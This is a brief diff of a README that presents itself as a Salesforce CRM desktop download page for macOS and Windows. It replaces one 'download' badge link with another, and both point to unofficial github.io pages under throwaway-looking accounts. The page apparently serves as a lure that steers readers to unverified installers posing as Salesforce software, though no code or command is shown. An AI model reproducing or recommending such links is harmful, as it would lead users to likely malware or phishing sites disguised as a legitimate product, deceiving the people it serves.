@@ -1,11 +1,6 @@
 # Salesforce Download — CRM Desktop App for MacOS & Windows
 
-<a href="https://gh-install-now.github.io/.github/?offer=Salesforce" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Salesforce%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
-    width="320" 
-    alt="Salesforce GitHub">
-</a>
+[![GET Salesforce CRM](https://img.shields.io/badge/GET%20%E2%80%94%20Salesforce-CRM-0078D6?style=for-the-badge&logoColor=white)](https://necilalrduran8403.github.io/.github/Salesforce-CRM)
 
 ---
 
